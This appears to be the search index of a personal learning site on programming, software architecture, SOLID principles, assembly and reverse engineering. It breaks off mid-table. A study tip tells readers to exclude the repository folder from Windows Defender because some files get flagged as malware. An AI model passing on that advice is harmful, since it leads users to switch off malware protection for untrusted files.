{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":"Cybersecurity &amp; Code Insights '25 <p>CCI25 is an open-source collection of notes, summaries, insights, etc. on computer science topics into a unified learning resource.</p> <p>Warning</p> <ul> <li>Some files may get flagged as malware by your system.</li> <li>This repository is catered towards Windows reverse engineering, not as much to cybersecurity operations / red teaming or blue teaming.</li> <li>No prior knowledge is needed.</li> </ul> <p>If you've found this learning resource to be useful and you appreciate the effort behind it, consider following the GitHub repository \u2764\ufe0f.</p>"},{"location":"study/","title":"How to study","text":""},{"location":"study/#study-tips","title":"Study tips","text":"<p>When studying computer science, it's important to follow the \"natural progression\". Some topics build on each other, meaning you can\u2019t write something without knowing your ABCs, just like you can\u2019t reverse software without understanding assembly and programming in general.</p> <p>Some topics are standalone, as they have their own separate path but eventually connect somewhere down the line. These standalone topics usually lead to a more integrated understanding as you progress:</p> <ul> <li>Programming</li> <li>Networking and security</li> </ul> <p>Key Takeaways:</p> <ul> <li>Use spaced repetition (e.g., Anki) for memorization.</li> <li>Write summaries like these, in your own words to reinforce understanding.</li> <li>Don't jump from topic to topic unless you know what you're doing. Most of the \"steps\" build on top of each other.</li> <li>Every small \"step\" you take should be a small practical project, code base, or challenge.</li> <li>Keep note of where you left off studying.</li> </ul>"},{"location":"study/#roadmap","title":"Roadmap","text":"<pre><code>    graph TD;\n\n    subgraph Code[Programming fundamentals]\n        subgraph HL[High-Level]\n            cs[\"C# (C Sharp)\"]\n        end\n        subgraph LL[Lower-Level]\n            cpp[C / C++]\n            --&gt; x86-64[x86 / x86_64 assembly]\n        end\n    end\n\n    subgraph OS[Operating System fundamentals]\n        os[Operating systems]\n        --&gt; winint[Windows internals]\n    end\n\n    subgraph RE[Reverse Engineering]\n        sa[Static analysis]\n        da[Dynamic analysis]\n        dd[Debuggers &amp; Disassemblers]\n    end\n\n    subgraph NS[Networking and security]\n        subgraph NET[Networking Concepts]\n            osi[OSI Model]\n            ip[IP Model]\n            tecp[TCP/IP Protocols]\n        end\n\n        subgraph PEN[Pentesting basics]\n            REC[Reconnaissance &amp; Scanning]\n            EXP[Exploiting &amp; Post-Exploitation]\n            SOC[SOC Techniques]\n        end\n    end\n\n    LL &lt;-.-&gt; RE\n    OS &lt;-.-&gt; RE\n    NET -.-&gt; PEN</code></pre>"},{"location":"study/#technical-tips","title":"Technical Tips","text":"<p>Tip</p> <ul> <li>In case you are studying this using the raw GitHub files, add this folder to your Windows Defender exclusions as it might remove valuable resources.</li> <li>Install add-ons like Dark Reader and Remove HTML Elements to make reading better on supported webpages.</li> <li>If you really can't wrap your head around something, just ask ChatGPT or other AI to clarify it.</li> <li>Make bookmarks of useful resources in your browser application.</li> </ul>"},{"location":"About/changelog/","title":"Changelog","text":""},{"location":"About/changelog/#past","title":"Past","text":""},{"location":"About/changelog/#353-apr-21-2025","title":"3.5.3 Apr 21, 2025","text":"<p>Added:</p> <ul> <li>Changes to the About me page.</li> <li>Changes to the Portfolio page.</li> </ul>"},{"location":"About/changelog/#352-apr-8-2025","title":"3.5.2 Apr 8, 2025","text":"<p>Added:</p> <ul> <li>References</li> </ul>"},{"location":"About/changelog/#351-apr-7-2025","title":"3.5.1 Apr 7, 2025","text":"<p>Added:</p> <ul> <li>Contribution &amp; Style guide</li> <li>Profile pic in About me</li> <li>Changelog</li> </ul>"},{"location":"About/changelog/#350-apr-2-2025","title":"3.5.0 Apr 2, 2025","text":"<p>Switched the framework over to MkDocs-Material.</p>"},{"location":"About/changelog/#250-mar-26-2025","title":"2.5.0 Mar 26, 2025","text":"<p>Started hosting a github pages with the unified repository using Jekyll \"Just the docs\".</p>"},{"location":"About/changelog/#150-mar-23-2025","title":"1.5.0 Mar 23, 2025","text":"<p>Added a Windows Internals summary (unfinished).</p>"},{"location":"About/changelog/#140-feb-11-2025","title":"1.4.0 Feb 11, 2025","text":"<p>Added a Reverse Engineering summary (unfinished).</p>"},{"location":"About/changelog/#130-jan-25-2025","title":"1.3.0 Jan 25, 2025","text":"<p>Added a CyberSecurity summary (unfinished).</p>"},{"location":"About/changelog/#120-jan-7-2025","title":"1.2.0 Jan 7, 2025","text":"<p>Unified my C++, C# and x86 Assembly summaries into one singular repository named CCI25.</p>"},{"location":"About/changelog/#030-oct-2024","title":"0.3.0 Oct, 2024","text":"<p>Released my notes / summary on C#.</p>"},{"location":"About/changelog/#020-sep-2024","title":"0.2.0 Sep, 2024","text":"<p>Released my notes / summary on x86 Assembly using NASM and MASM compilers.</p>"},{"location":"About/changelog/#010-aug-2024","title":"0.1.0 Aug, 2024","text":"<p>Released my notes / summary on LearnCpp's C-Style / C++ chapters.</p>"},{"location":"About/changelog/#future","title":"Future","text":"<ul> <li>Unify C# and C++ into a singular \"programming\" course.</li> <li>Re-structure x86_64 Assembly course to have a better structure and feel less sloppy.</li> <li>Complete Software Architecture by reading book</li> <li>Complete Windows Internals by reading book</li> <li>Complete Networks by following a CCNA course</li> <li>Complete CyberSecurity slowly by being more active on TryHackMe or HackTheBox</li> </ul>"},{"location":"About/contribute/","title":"Contribution &amp; Style guide","text":""},{"location":"About/contribute/#github-contribution-workflow","title":"GitHub Contribution Workflow","text":"<p>Contribution can be done by following these steps:</p> <ol> <li>Fork the repository to create your own copy.</li> <li>Create a new branch to make your changes (preferably with a descriptive name).</li> <li>Make your changes\u2014whether it's bug fixes, new features, or documentation updates.</li> <li>Commit your changes with a clear and concise commit message.</li> <li>Push your changes to the appropriate branch in your fork.</li> <li>Create a pull request from your branch to the <code>main</code> branch of this repository.</li> </ol> <p>For more detailed information on contributing to a project on GitHub, please refer to the official GitHub Contribution Guide.</p>"},{"location":"About/contribute/#style-guide","title":"Style guide","text":"<p>This project is statically generated using MkDocs-Material, which uses a specific Markdown format. Please keep the following in mind when contributing:</p> <ul> <li>Ensure that any code samples use proper Markdown syntax highlighting. Use <code>linenums=\"1\"</code> for better readability of the code.</li> <li>For optimal rendering, make sure your Markdown files follow the correct structure and formatting. You can test the website locally by following the MkDocs-Material Installation Guide.</li> </ul> <p>Example</p> C#C++ main.cs<pre><code>using System;\n\nnamespace ConsoleProject\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            Console.WriteLine(\"Hello world!\");\n        }\n    }\n}\n</code></pre> main.cpp<pre><code>#include &lt;iostream&gt;\n\nint main()\n{\n    std::cout &lt;&lt; \"Hello world!\" &lt;&lt; std::endl;\n    return 0;\n}\n</code></pre>"},{"location":"About/contribute/#pull-request-guidelines","title":"Pull Request Guidelines","text":"<p>To ensure a smooth review process, please adhere to the following guidelines when submitting a pull request:</p> <ul> <li>Provide a clear, detailed description of the changes you\u2019ve made, including the motivation behind them and any relevant context. Without a sufficient description, your pull request may be ignored or closed without review.</li> <li>Follow the correct formatting guidelines. Pull requests with improper formatting may be asked to be revised until they render correctly.</li> </ul> <p>Warning</p> <p>Pull requests lacking a detailed description or proper formatting may be rejected. We encourage you to write well-documented, easy-to-read code to streamline the review process.</p> <p>By following these guidelines, you'll help maintain the quality and consistency of the project and make it easier for maintainers to review and merge your contributions.</p>"},{"location":"About/github/","title":"Hello, world!","text":"<p>I'm Grimy86, a passionate low-level programmer and cybersecurity enthusiast. I love diving deep into how things work under the hood and sharing my knowledge with the open-source community to help others learn and grow.</p>"},{"location":"About/github/#current-project","title":"\ud83d\udea7 Current Project","text":""},{"location":"About/github/#upcoming-goals","title":"\ud83d\udcda Upcoming Goals","text":""},{"location":"About/github/#reverse-engineering-project-assaultcube","title":"Reverse Engineering Project: AssaultCube","text":"<ul> <li>Building a C++ trainer through reverse engineering:<ul> <li> Learn how external cheats work</li> <li> Build a simple internal hack</li> <li> Write a custom DLL injector</li> <li> Explore function hooking</li> <li> Call in-game functions</li> <li> Build an ESP overlay</li> </ul> </li> </ul>"},{"location":"About/github/#open-source-cybersecurity-code-insights-project-cci25","title":"Open-Source Cybersecurity &amp; Code Insights Project: CCI25","text":"<ul> <li>Maintaining my knowledge base:<ul> <li>Summarizing key books:<ul> <li> Design Patterns: Elements of Reusable Object-Oriented Software</li> <li> Windows Internals (Part 1)</li> <li> Refactoring.Guru: Refactoring</li> <li> Refactoring.Guru: Design Patterns</li> </ul> </li> <li>Refactoring sections:<ul> <li> Merge C# and C++ into a unified programming course</li> <li> Organize x86_64 notes</li> <li> Restructure reverse engineering notes</li> <li> Restructure networking &amp; cybersecurity notes</li> </ul> </li> </ul> </li> </ul>"},{"location":"About/github/#tech-stack","title":"\ud83d\udee0\ufe0f Tech Stack","text":""},{"location":"About/portfolio/","title":"Portfolio","text":"2023 <p>Basic Win32 OS API in .NET with P/Invoke</p> 2024 <p>T-SQL, SQL databases, SSMS &amp; Database normalization techniques</p> <ul> <li>Calling stored procedures in ADO.NET.</li> <li>How to apply ADO.NET for other database servers like MySql / MariaDb.</li> <li>Wrote a DLL to simplify the use of ADO.NET and integrating hardware logging.</li> </ul> <p>WPF traffic intersection simulation</p> <p>Hosted a Linux arm32 webserver on a Raspberry PI</p> <p>C++, compilation and x86 architecture</p> <p>Analyzing process memory using scanners and debuggers</p> <p>Simple process viewer in Python using Tkinter</p> <p>Web terminal CLI in JavaScript, HTML and CSS</p> <p>Sysadmin using scripting languages &amp; Azure cloud</p> 2025 <p>DAL-service Software architecture in C#</p> <ul> <li>SystemInfoService: NTAccounts, OS Info &amp; CPU Info</li> <li>MailService with Google SmtpClient</li> <li>WindowsProcessService: Launching &amp; executing processes</li> </ul> <p>TryHackMe's Hackfinity student contest @ Cyber Legion</p> <p>More .NET frameworks:</p> <ul> <li>.NET MAUI</li> <li>ASP.NET (.NET Aspire) REST API in MVC using Entity Framework</li> <li>.NET Blazor</li> </ul> <p>Hosting Markdown docs as static webpages for web code documentation.</p> <p>Business App Project in WPF &amp; ADO.NET</p> <p>- Responsible for GitHub: Version Control System, Code Reviewing, Documentation, etc.</p> <p>- Sticky Notes Overlay Window</p> <p>- App-wide Exception Handling, Logging, Mailing &amp; Exporting data</p>"},{"location":"About/references/","title":"References","text":""},{"location":"About/references/#learn-programming","title":"Learn programming","text":""},{"location":"About/references/#c","title":"C++","text":"<ul> <li>cppreference</li> <li>cplusplus reference</li> <li>W3Schools DSA Intro</li> <li>hackingcpp cheat sheets</li> </ul>"},{"location":"About/references/#x86x86_64","title":"x86/x86_64","text":"<ul> <li>Godbolt Compiler Explorer</li> <li>JLearn PH's MASM32 assembly programming playlist</li> <li>MASM reference for more information on x86 assembly in MASM32.</li> <li>x86 and amd64 instruction reference for more information on x86 instructions.</li> <li>Malwareunicorn's instruction searcher</li> <li>Tutorialspoint Nasm assembly</li> <li>Davy Wybiral's intro to x86 assembly language playlist</li> <li>OliveStem's x86 assembly with NASM playlist</li> <li>ost2.fyi's Architecture 2001: x86-64 OS Internals</li> <li>asmtutor</li> </ul>"},{"location":"About/references/#design-architecture","title":"Design &amp; Architecture","text":"<ul> <li>Design Patterns: Elements of Reusable Object-Oriented Software</li> <li>Refactoring guru's Design Patterns</li> </ul>"},{"location":"About/references/#windows-internals","title":"Windows Internals","text":"<ul> <li>Pavel Yosifovich's windows internals</li> <li>Pavel Yosifovich's youtube channel</li> <li>0xRick's dive into PE file format</li> <li>Empyreal96's info depot</li> <li>Alex Ionescu's blog</li> <li>Duncan Ogilvie's internals crash course</li> <li>Alexander Sotirov's internals talk</li> <li>Crow's malware development playlist</li> <li>Red Team Notes on reversing, forensics &amp; misc</li> <li>Rexir's Windows Internals Videos</li> <li>TheSourceLens's Windows Internals part 1 playlist</li> <li>Nir Lichtman's diving into windows internals playlist</li> <li>Geoff Chappell</li> <li>Alex Ionescu's ReactOS</li> <li>Programming reference for the Win32 API</li> <li>ost2.fyi</li> <li>mr.d0x's malapi list</li> <li>pinvoke.net</li> <li>Vergilius project</li> <li>TechsavvyProductions</li> <li>Driver Verifier Tool</li> </ul>"},{"location":"About/references/#reverse-engineering","title":"Reverse Engineering","text":"<ul> <li>TryHackMe</li> <li>jstrosch's learning reverse engineering repo</li> <li>Dr Josh Stroschein - The Cyber Yeti youtube channel</li> <li>Godbolt Compiler Explorer</li> <li>Programming reference for the Win32 API</li> <li>FLARE VM</li> <li>REMnux</li> <li>FLOSS</li> <li>Reverse Engineering Resources-Beginners to intermediate Guide/Links</li> <li>ost2.fyi</li> <li>0xZ0F's Reverse Engineering Course repo</li> <li>wtsxDev's list of reverse engineering resources</li> <li>Malwareunicorn's workshops</li> </ul>"},{"location":"About/references/#networks","title":"Networks","text":"<ul> <li>IANA's Service Name and Transport Protocol Port Number Registry</li> <li>David Bombal Tech's CCNA course</li> <li>Jeremy's IT Lab CCNA course</li> <li>NetworkChuck's CCNA course</li> <li>Ryan Beney's CCNA course</li> <li>Naj Qazi's CCNA course</li> </ul>"},{"location":"About/references/#cybersecurity","title":"CyberSecurity","text":"<ul> <li>TryHackMe</li> <li>HackTheBox</li> <li>A-Z Index of the Linux command line: bash + utilities</li> </ul>"},{"location":"Architecture/Class_Relationships/","title":"Class relationships","text":"<p>In object-oriented programming, classes can interact with each other in different ways. The primary relationships between classes are <code>Association</code>, <code>Composition</code>, and <code>Aggregation</code>. Understanding these relationships helps design cleaner, more maintainable code.</p>"},{"location":"Architecture/Class_Relationships/#association","title":"Association","text":"<p>Association is a \"uses a\" relationship, where one <code>class uses another</code> class to perform a task. The classes involved in an association can exist independently. In association, one class might use another class\u2019s methods or behaviors, but neither class owns the other.</p> <p>Key Points: - Classes can interact without ownership. - The lifetime of classes is independent. - Often implemented via references, pointers, or method parameters.</p> <pre><code>public class Student\n{\n    public int StudentId { get; set; }\n    public string FirstName { get; set; }\n}\n\npublic class StudentRepository\n{\n    public Student GetStudent(int studentId) // Actively using the Student class\n    {\n        return new Student();\n    }\n}\n</code></pre>"},{"location":"Architecture/Class_Relationships/#composition","title":"Composition","text":"<p>Composition is a \"has a\" relationship, where one <code>class contains a reference to another</code> class. In this relationship, the containing class (parent) owns the contained class (child). If the parent class is deleted, the child class will also be deleted.</p> <p>Key Points: - The parent class owns the child class. - The child class cannot exist without the parent class. - Deleting the parent also deletes the child.</p> <p>Example: <pre><code>public class Address\n{\n    public string Street { get; set; }\n    public string City { get; set; }\n}\n\npublic class Student\n{\n    public int StudentId { get; set; }\n    public Address HomeAddress { get; set; } // Including the Address class\n}\n</code></pre> Here, the Student class owns the Address class. If the Student object is deleted, the <code>Address object will also be deleted</code>, indicating a composite relationship.</p>"},{"location":"Architecture/Class_Relationships/#aggregation","title":"Aggregation","text":"<p>Aggregation is a special type of composition, but in this relationship, the <code>child class can exist independently of the parent class</code>. The parent class holds a reference to the child class, but the child can live without the parent.</p> <p>Key Points: - Aggregation is a \"has a\" relationship. - The parent contains a reference to the child, but the child can exist independently. - Deleting the parent does not delete the child.</p> <p>Example: <pre><code>public class Course\n{\n    public int CourseId { get; set; }\n    public string CourseName { get; set; }\n}\n\npublic class Student\n{\n    public int StudentId { get; set; }\n    public Course EnrolledCourse { get; set; }\n}\n</code></pre> In this example, the Student class has a reference to the Course class. However, if the Student is deleted, the <code>Course can still exist independently</code>, indicating an aggregation relationship.</p>"},{"location":"Architecture/Common_Architectures/","title":"Common Software Architectures","text":"Architecture Best for Key Benefit <code>MVVM</code> WPF, MAUI, Xamarin Data binding, testability <code>MVC</code> Web apps (ASP.NET, Django) Scalability, separation <code>MVP</code> WinForms, legacy apps Easier unit testing <code>Layered</code> Enterprise apps Clear separation of concerns <code>Microservices</code> Cloud-based, scalable apps Independent services <code>Event-Driven</code> Real-time, IoT High responsiveness <code>Hexagonal</code> Large applications Flexibility, maintainability <code>Clean</code> Scalable systems Strong separation, longevity <code>CQRS</code> High-performance apps Optimized read/write ops <code>ECS</code> Game development Better performance"},{"location":"Architecture/Common_Architectures/#mvvm-model-view-viewmodel","title":"MVVM (Model-View-ViewModel)","text":"<p>MVVM separates the UI (View) from the business logic (ViewModel) while keeping data and state management in the Model.</p> <ul> <li>Used in: WPF, MAUI, Xamarin  </li> <li>Best for: Desktop &amp; mobile apps  </li> </ul> <p>Components:</p> <ul> <li>Model: Manages data and business logic (e.g., database calls).</li> <li>View: The UI (XAML in WPF/MAUI).</li> <li>ViewModel: Acts as a bridge between the View and Model using data binding.</li> </ul>"},{"location":"Architecture/Common_Architectures/#mvc-model-view-controller","title":"MVC (Model-View-Controller)","text":"<p>The Controller processes user requests (e.g., <code>/GetUser</code>), retrieves data from the Model, and passes it to the View.</p> <ul> <li>Used in: ASP.NET Core, Spring, Django  </li> <li>Best for: Web apps &amp; APIs  </li> </ul> <p>Components:</p> <ul> <li>Model: Handles data and business logic.</li> <li>View: UI layer (HTML, Razor, or templates).</li> <li>Controller: Handles user input and updates Model/View.</li> </ul>"},{"location":"Architecture/Common_Architectures/#mvp-model-view-presenter","title":"MVP (Model-View-Presenter)","text":"<p>Similar to MVVM, but the Presenter directly updates the View (no data binding like MVVM).</p> <ul> <li>Used in: WinForms, legacy desktop apps  </li> <li>Best for: Older desktop applications  </li> </ul> <p>Components:</p> <ul> <li>Model: Manages data.</li> <li>View: Displays UI, but contains no logic.</li> <li>Presenter: Acts as a mediator between Model and View.</li> </ul>"},{"location":"Architecture/Common_Architectures/#layered-architecture-n-tier","title":"Layered Architecture (N-Tier)","text":"<p>A structured architecture where components are divided into separate layers.</p> <ul> <li>Used in: Large applications, enterprise software  </li> <li>Best for: Scalable web and desktop applications  </li> </ul> <p>Common Layers:</p> <ol> <li>Presentation Layer: UI (Web, desktop, API)</li> <li>Business Logic Layer (BLL): Processes data</li> <li>Data Access Layer (DAL): Handles database interactions  </li> </ol>"},{"location":"Architecture/Common_Architectures/#microservices-architecture","title":"Microservices Architecture","text":"<p>Instead of a single app, multiple independent services communicate via APIs (REST, gRPC).</p> <ul> <li>Used in: Netflix, Amazon, Cloud applications  </li> <li>Best for: Large, scalable web services  </li> </ul> <p>Why Use Microservices?</p> <p>\u2705 Scalable \u2705 Independent deployment \u2705 Fault-tolerant  </p>"},{"location":"Architecture/Common_Architectures/#event-driven-architecture","title":"Event-Driven Architecture","text":"<p>A system where components react to events instead of directly calling each other.</p> <ul> <li>Used in: IoT, real-time apps, trading systems  </li> <li>Best for: High-performance, decoupled applications  </li> </ul> <p>Why Use It?</p> <p>\u2705 Components are loosely coupled \u2705 High responsiveness \u2705 Better scalability  </p>"},{"location":"Architecture/Common_Architectures/#hexagonal-ports-and-adapters-architecture","title":"Hexagonal (Ports and Adapters) Architecture","text":"<p>Focuses on isolating core business logic and keeping dependencies (UI, Database, APIs) separate. </p> <ul> <li>Used in: Scalable applications, long-term projects  </li> <li>Best for: Maintainable and testable code  </li> </ul> <p>Why Use It?</p> <p>\u2705 Increased testability \u2705 More flexibility for changing technologies  </p>"},{"location":"Architecture/Common_Architectures/#clean-architecture","title":"Clean Architecture","text":"<p>A layered design that keeps the core business logic at the center, making dependencies flow inward.</p> <ul> <li>Used in: Large applications  </li> <li>Best for: Long-term maintainability  </li> </ul> <p>Why Use It?</p> <p>\u2705 Separation of concerns \u2705 Better dependency management  </p>"},{"location":"Architecture/Common_Architectures/#cqrs-command-query-responsibility-segregation","title":"CQRS (Command-Query Responsibility Segregation)","text":"<p>Separates read operations from write operations to optimize performance.</p> <ul> <li>Used in: High-performance web apps, financial systems  </li> <li>Best for: Systems with heavy database operations  </li> </ul> <p>Why Use It?</p> <p>\u2705 Faster queries \u2705 Scales well with microservices  </p>"},{"location":"Architecture/Common_Architectures/#ecs-entity-component-system","title":"ECS (Entity-Component-System)","text":"<p>A game development pattern that replaces traditional OOP hierarchies with a data-driven approach.  </p> <ul> <li>Used in: Unity, Unreal Engine  </li> <li>Best for: Performance-intensive games  </li> </ul> <p>Why Use It?</p> <p>\u2705 More efficient than OOP \u2705 Better memory management</p>"},{"location":"Architecture/Design_Patterns/","title":"Design patterns","text":"<p>A design pattern is a reusable solution to a common programming problem. It helps make your code more structured, maintainable, and scalable.</p> <ul> <li>Avoid rewriting code for the same problems.</li> <li>Improve code readability and reusability.</li> <li>Make your code more flexible to changes.</li> </ul> <p>Types of design patterns: There are three main types of design patterns:</p> <ul> <li>Creational Patterns: How objects are created.</li> <li>Structural Patterns: How objects are structured &amp; connected.</li> <li>Behavioral Patterns: How objects interact &amp; communicate.</li> </ul>"},{"location":"Architecture/Design_Patterns/#creational-design-patterns-control-object-creation","title":"Creational design patterns (control object creation)","text":"<p>These patterns provide better ways to control object creation, in a flexible way.</p> Pattern What it Does Example Use Case Singleton Ensures only one instance of a class exists. Database connections, Logging Factory Method A method creates objects instead of new keyword. Creating different payment methods (CreditCard, PayPal) Abstract Factory A factory that creates factories of related objects. UI toolkit for Windows &amp; Mac Builder Builds complex objects step by step. Creating a Burger with different toppings Prototype Copies an existing object instead of creating a new one. Copying a user profile"},{"location":"Architecture/Design_Patterns/#structural-design-patterns-control-class-relationships","title":"Structural Design Patterns (control class relationships)","text":"<p>These patterns deal with how objects are connected and structured.</p> Pattern What it Does Example Use Case Adapter Converts one interface into another. Using an old API in a new system Bridge Separates abstraction from implementation. UI themes with different rendering engines Composite Treats a group of objects like a single object. Folder structure in Windows Explorer Decorator Adds extra behavior to objects dynamically. Adding extra features to a car (e.g., Sunroof) Facade Provides a simple interface to a complex system. A single API call to simplify multiple services Flyweight Uses shared objects to save memory. Text editors where characters share styles Proxy Controls access to an object. Security check before accessing an object"},{"location":"Architecture/Design_Patterns/#behavioral-design-patterns-control-object-communication","title":"Behavioral Design Patterns (control object communication)","text":"<p>These patterns define how objects interact with each other.</p> Pattern What it Does Example Use Case Chain of Responsibility Passes a request through a chain of handlers. Support ticket escalation (Level 1 \u2192 Level 2 \u2192 Manager) Command Encapsulates a request as an object. Undo/Redo in text editors Interpreter Defines a grammar for interpreting language. Math expression evaluator Iterator Provides a way to loop through a collection without exposing details. Custom collections in C# Mediator Controls communication between multiple objects. Chatroom where users communicate via a server Memento Saves an object's state for undo functionality. Text editor undo feature Observer Notifies multiple objects when one object changes. Stock price alerts State Changes an object's behavior based on state. Traffic light system (Red, Yellow, Green) Strategy Allows switching between different algorithms. Sorting (BubbleSort, QuickSort) Template Method Defines the skeleton of an algorithm in a base class. Cooking recipes Visitor Adds extra functionality without modifying existing classes. Applying a discount to different products"},{"location":"Architecture/Pattern_matching/","title":"Pattern matching","text":"<p><code>Pattern matching</code> in C# is a powerful feature that allows you to <code>check whether an expression conforms to a certain structure or type</code> and, in some cases, extract values from it. It simplifies complex conditional logic, making the code more readable and expressive.</p> <p>Benefits:</p> <ul> <li>Reduces the need for lengthy if-else or switch statements.</li> <li>Allows for more readable and declarative code.</li> <li>Helps in performing type checks, null checks, and property comparisons concisely.</li> </ul>"},{"location":"Architecture/Pattern_matching/#value-checks","title":"Value checks","text":"<p>Used to check if an expression is equal to a specific constant (e.g., null, numbers, or specific values).</p> <pre><code>void IsNull(object obj)\n{\n    if (obj is null)\n    {\n        throw new ArgumentNullException(nameof(obj));\n    }\n}\n</code></pre>"},{"location":"Architecture/Pattern_matching/#type-checks","title":"Type checks","text":"<p>Checks if an object is of a certain type and, if so, casts it to that type in a single step. Eliminates the need for separate type checking and casting.</p> <pre><code>string IsType(object obj)\n{\n    if (obj is T someObject)\n    {\n        return $\"{obj} is the right type.\";\n    }\n    else\n    {\n        return $\"{obj} is not the right type.\";\n    }\n}\n</code></pre>"},{"location":"Architecture/Pattern_matching/#property-checks","title":"Property checks","text":"<p>Allows checking whether an object\u2019s properties match specific values. Checks both type and property values in one step.</p> <pre><code>string IsSpecificProperty(object obj)\n{\n    if (obj is object { PropertyNumber: 1, PropertyCharacter: 'A' } specificObject)\n    {\n        return $\"{obj} has number: {obj.PropertyNumber} and character {obj.PropertyCharacter}\";\n    }\n    return string.Empty;\n}\n</code></pre>"},{"location":"Architecture/Pattern_matching/#var-pattern-checks","title":"<code>var</code> pattern checks","text":"<p>Matches any expression and assigns it to a variable. Always matches and stores the value, useful for debugging or intermediate calculations.</p> <pre><code>var ReturnDetails(object obj)\n{\n    if (obj is var someObject)\n    {\n        return $\"obj details: {someObject}\";\n    }\n    return string.Empty;\n}\n</code></pre>"},{"location":"Architecture/SOLID/","title":"The SOLID principles","text":"<p>SOLID is a set of five principles introduced by Robert C. Martin to help create maintainable, scalable, and testable object-oriented software.</p> <p>These are principles, not design patterns. Principles guide software design, while patterns provide reusable solutions.</p> <ul> <li>Single Responsibility Principle (SRP): Each class should focus on a single task or responsibility.</li> <li>Open/Closed Principle (OCP): You should extend functionality using interfaces, not modifying existing code.</li> <li>Liskov Substitution Principle (LSP): Subclasses should follow the behavior of their base classes.</li> <li>Interface Segregation Principle (ISP): Interfaces should focus on a single task or responsibility, avoiding class dependency.</li> <li>Dependency Inversion Principle (DIP): Depend on interfaces instead of concrete classes.</li> </ul>"},{"location":"Architecture/SOLID/#single-responsibility-principle-srp","title":"Single Responsibility Principle (SRP)","text":"<p>A class should have only one reason to change.</p> <ul> <li>Each class should focus on a single task or responsibility.</li> <li>If a class has multiple responsibilities, split it into smaller classes.</li> </ul> <pre><code>// \u274c Violating SRP: Handles both data and file operations\npublic class Report\n{\n    public string Content { get; set; }\n    public void SaveToFile(string path) { /* Saves content to a file */ }\n}\n\n// \u2714 Following SRP: Separate responsibilities into two classes\npublic class Report\n{\n    public string Content { get; set; }\n}\n\npublic class ReportSaver\n{\n    public void SaveToFile(Report report, string path) { /* Saves content to a file */ }\n}\n</code></pre>"},{"location":"Architecture/SOLID/#openclosed-principle-ocp","title":"Open/Closed Principle (OCP)","text":"<p>Software should be open for extension, but closed for modification.</p> <ul> <li>You should extend functionality without modifying existing code.</li> <li>Use inheritance or interfaces to add new behaviors.</li> </ul> <pre><code>// \u274c Violating OCP: Modifying the existing class to add new behavior\npublic class PaymentProcessor\n{\n    public void ProcessPayment(string type)\n    {\n        if (type == \"CreditCard\") { /* Process credit card */ }\n        else if (type == \"PayPal\") { /* Process PayPal */ }\n    }\n}\n\n// \u2714 Following OCP: Using abstraction for extensibility\npublic interface IPaymentMethod { void Pay(); }\n\npublic class CreditCardPayment : IPaymentMethod { public void Pay() { /* Credit card logic */ } }\npublic class PayPalPayment : IPaymentMethod { public void Pay() { /* PayPal logic */ } }\n\npublic class PaymentProcessor\n{\n    public void ProcessPayment(IPaymentMethod paymentMethod) { paymentMethod.Pay(); }\n}\n</code></pre>"},{"location":"Architecture/SOLID/#liskov-substitution-principle-lsp","title":"Liskov Substitution Principle (LSP)","text":"<p>A subclass should be able to replace its superclass without breaking the program.</p> <ul> <li>Subclasses should follow the behavior of their base classes.</li> <li>Avoid breaking expected behavior when using inheritance.</li> </ul> <pre><code>// \u274c Violating LSP: Square incorrectly inherits from Rectangle\npublic class Rectangle\n{\n    public virtual double Width { get; set; }\n    public virtual double Height { get; set; }\n\n    public double Area() =&gt; Width * Height;\n}\n\npublic class Square : Rectangle\n{\n    public override double Width\n    {\n        set { base.Width = base.Height = value; } // Unexpected side effect\n    }\n\n    public override double Height\n    {\n        set { base.Width = base.Height = value; } // Unexpected side effect\n    }\n}\n\n// \u2714 Following LSP: Separate Square and Rectangle using a common interface\npublic interface IShape\n{\n    double Area();\n}\n\npublic class RectangleProper : IShape\n{\n    public double Width { get; set; }\n    public double Height { get; set; }\n\n    public double Area() =&gt; Width * Height;\n}\n\npublic class SquareProper : IShape\n{\n    public double Side { get; set; }\n\n    public double Area() =&gt; Side * Side;\n}\n</code></pre>"},{"location":"Architecture/SOLID/#interface-segregation-principle-isp","title":"Interface Segregation Principle (ISP)","text":"<p>Clients should not be forced to depend on methods they do not use.</p> <ul> <li>Large interfaces should be split into smaller, more specific ones.</li> <li>Classes should only implement the methods they need.</li> </ul> <pre><code>// \u274c Violating ISP: A printer interface forces all classes to implement every method\npublic interface IPrinter\n{\n    void Print();\n    void Scan();\n    void Fax();\n}\n\npublic class BasicPrinter : IPrinter\n{\n    public void Print() { /* Works */ }\n    public void Scan() { throw new NotImplementedException(); } // \u274c Unnecessary\n    public void Fax() { throw new NotImplementedException(); }  // \u274c Unnecessary\n}\n\n// \u2714 Following ISP: Split into multiple interfaces\npublic interface IPrinter { void Print(); }\npublic interface IScanner { void Scan(); }\npublic interface IFax { void Fax(); }\n\npublic class BasicPrinter : IPrinter { public void Print() { /* Works */ } }\n</code></pre>"},{"location":"Architecture/SOLID/#dependency-inversion-principle-dip","title":"Dependency Inversion Principle (DIP)","text":"<p>High-level modules should not depend on low-level modules. Both should depend on abstractions.</p> <ul> <li>Depend on interfaces instead of concrete classes.</li> <li>Helps with decoupling and makes the code more testable.</li> </ul> <pre><code>// \u274c Violating DIP: The EmailService directly depends on a concrete class\npublic class EmailService\n{\n    private readonly SmtpClient _smtpClient = new SmtpClient(); // Tight coupling\n    public void SendEmail() { _smtpClient.Send(); }\n}\n\n// \u2714 Following DIP: Depend on an abstraction (interface)\npublic interface IEmailSender { void Send(); }\n\npublic class SmtpEmailSender : IEmailSender { public void Send() { /* Email logic */ } }\n\npublic class EmailService\n{\n    private readonly IEmailSender _emailSender;\n    public EmailService(IEmailSender emailSender) { _emailSender = emailSender; }\n    public void SendEmail() { _emailSender.Send(); }\n}\n</code></pre>"},{"location":"Assembly/Compiling/","title":"Compiling","text":"<p>Warning</p> <p>To compile NASM on windows download NASM &amp; w64devkit-x86.</p> <p>Use NASM to assemble the .asm file into an object file (.obj). Run this command in the same directory where the .asm file is located: <code>nasm -f win32 -o fileName.obj fileName.asm</code></p> <p>Use GCC to link the .obj file and create the final executable (.exe). Run this command: <code>gcc -mconsole -nostartfiles -o fileName.exe fileName.obj</code></p>"},{"location":"Assembly/Architecture/Binary_Operations/","title":"Binary operations","text":"<p>True / false: In programming 1 is generally respresented as a value being \"True\" and 0 as one being \"False\".</p> Operation Symbol Description Example Result NOT <code>!</code> Flips the bit (1 becomes 0, 